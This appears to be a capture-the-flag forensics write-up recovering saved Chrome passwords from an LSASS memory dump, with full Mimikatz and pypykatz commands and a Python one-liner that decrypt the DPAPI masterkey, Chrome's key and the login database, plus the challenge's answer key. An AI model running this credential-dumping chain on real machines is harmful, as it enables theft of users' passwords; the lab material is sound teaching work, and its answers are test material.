# Level 3 – Chrome Credential Recovery

## Scenario

The Windows forensic artifact `chrome_cracker.zip` contains an LSASS process dump and a copied Google Chrome profile. The objective is to recover the Windows DPAPI material from memory, decrypt Chrome's browser encryption key, and recover the credentials saved for `chaincrypto.com`.

> Perform these steps only on the supplied challenge artifacts inside the authorized forensic lab.

## Artifacts

The important files are:

```text
lsass.DMP
Google\Chrome\User Data\Local State
Google\Chrome\User Data\Default\Login Data
```

- `lsass.DMP` contains cached logon and DPAPI material.
- `Local State` contains Chrome's DPAPI-protected `os_crypt.encrypted_key` value.
- `Login Data` is a SQLite database containing saved-login records and encrypted passwords.

## Tools Used

- Windows Prefetch analysis
- Mimikatz — the tool identified by the challenge
- pypykatz — used as the available Python alternative for offline LSASS and DPAPI analysis
- Python
- Notepad or another text editor

## Final Answers

| Challenge | Answer |
|---|---|
| Tool used to extract the MasterKey | `Mimikatz` |
| Attacker's Windows username | `LabUser` |
| Starting 10 characters of the MasterKey | `9c3bca41e3` |
| Starting 10 characters of the Final Secret Key | `3bd3bef8ad` |
| Website username and password | `TechExplorer / P@$$w0rd_Str0ng!92` |

---

## Challenge 1 – Identify the MasterKey Extraction Tool

A search of the Windows Prefetch directory revealed several execution traces:

```text
C:\Windows\Prefetch\MIMIKATZ.EXE-DA72EDC1.pf
C:\Windows\Prefetch\MIMIKATZ.EXE-0A6C6170.pf
C:\Windows\Prefetch\MIMIKATZ.EXE-3B40BAA8.pf
```

These Prefetch records show that `mimikatz.exe` had been executed on the investigated system. Mimikatz supports loading an offline LSASS minidump and reading cached DPAPI material with commands such as:

```text
sekurlsa::minidump lsass.DMP
sekurlsa::dpapi
```

The executable itself was not present in the working directory, so pypykatz was used later to reproduce the extraction from the supplied dump.

**Answer:**

```text
Mimikatz
```

## Challenge 2 – Identify the Windows Username

The active profile path shown by the extracted artifacts and command prompt was:

```text
C:\Users\LabUser\Desktop
```

The Chrome evidence was also accessed beneath the same `LabUser` profile. Although `Admin` appeared in one of the LSASS logon sessions, that record represented a session found inside memory and was not the username requested by this challenge.

**Answer:**

```text
LabUser
```

## Challenge 3 – Extract the DPAPI MasterKey

### 1. Open Command Prompt

Change to the directory containing `lsass.DMP` and the extracted `Google` folder:

```cmd
cd C:\Users\LabUser\Desktop
```

### 2. Parse the LSASS dump with pypykatz

The direct `pypykatz` command was not recognized in the VM, so it was invoked through the Python launcher:

```cmd
py -m pypykatz dpapi minidump .\lsass.DMP -o masterkey.json
```

To generate a readable LSASS summary as well, use:

```cmd
py -m pypykatz lsa minidump .\lsass.DMP -o summary.txt
```

Open the output if required:

```cmd
notepad summary.txt
```

The relevant DPAPI record contained a `masterkey` beginning with:

```text
9c3bca41e3
```

It was associated with this key GUID:

```text
f7ecfe82-d268-4507-8761-3ccdbef6496b
```

**Answer:**

```text
9c3bca41e3
```

## Challenge 4 – Recover Chrome's Final Secret Key

Chrome stores its encrypted browser key in the following JSON field inside `Local State`:

```text
os_crypt.encrypted_key
```

The value is Base64-decoded, its five-byte `DPAPI` prefix is removed, and the remaining DPAPI blob is decrypted using the recovered masterkey.

Run the following command from `C:\Users\LabUser\Desktop`:

```cmd
py -c "import json,base64; from pypykatz.dpapi.dpapi import DPAPI; d=DPAPI(); d.load_masterkeys(r'masterkey.json'); e=base64.b64decode(json.load(open(r'Google\Chrome\User Data\Local State'))['os_crypt']['encrypted_key'])[5:]; print(d.decrypt_blob_bytes(e).hex())"
```

The resulting 32-byte Chrome secret key was:

```text
3bd3bef8ad848d75d91ce86d07de766ad52877827e0942918df20456853c81ac
```

Its first ten characters are:

```text
3bd3bef8ad
```

**Answer:**

```text
3bd3bef8ad
```

## Challenge 5 – Decrypt the Saved chaincrypto.com Login

The earlier Chrome command returned an empty output because it was given only `Local State`. The `Login Data` database must also be supplied using `--logindata`:

```cmd
py -m pypykatz dpapi chrome .\masterkey.json ".\Google\Chrome\User Data\Local State" --logindata ".\Google\Chrome\User Data\Default\Login Data" > cred.txt
```

Open the result:

```cmd
notepad cred.txt
```

Alternatively, filter the result for the target domain:

```cmd
findstr /I "chaincrypto.com" cred.txt
```

The recovered saved-login record contained:

```text
Username: TechExplorer
Password: P@$$w0rd_Str0ng!92
```

**Answer:**

```text
TechExplorer / P@$$w0rd_Str0ng!92
```

## How the Decryption Chain Works

1. The LSASS dump contains cached Windows DPAPI key material.
2. Mimikatz or pypykatz extracts the DPAPI MasterKey from the dump.
3. The MasterKey decrypts the DPAPI blob stored in Chrome's `Local State` file.
4. This produces Chrome's 32-byte AES secret key.
5. The AES key decrypts the password values stored in the `Login Data` SQLite database.
6. Filtering the decrypted records for `chaincrypto.com` reveals the saved username and password.

## Troubleshooting Notes

### `pypykatz is not recognized`

Invoke the installed package through Python instead:

```cmd
py -m pypykatz ...
```

If the package is not installed in the lab VM:

```cmd
py -m pip install pypykatz
```

### Chrome output file is empty

Ensure that the command includes both:

```text
Local State
Default\Login Data
```

The login database must be passed with the `--logindata` option.

### `Admin` is rejected as the Windows username

Do not assume every username found in LSASS is the requested account. Verify the profile path associated with the supplied artifacts. In this challenge, the correct profile is `C:\Users\LabUser`.

## References

- [pypykatz GitHub repository and command documentation](https://github.com/skelsec/pypykatz)
- [pypykatz command-line wiki](https://github.com/skelsec/pypykatz/wiki)

## Conclusion

The investigation connected Windows memory evidence with Chrome's local browser artifacts. Prefetch identified Mimikatz as the original extraction tool, while pypykatz reproduced the offline DPAPI workflow. The recovered MasterKey unlocked Chrome's `Local State` secret key, which then decrypted the `Login Data` record for `chaincrypto.com`.
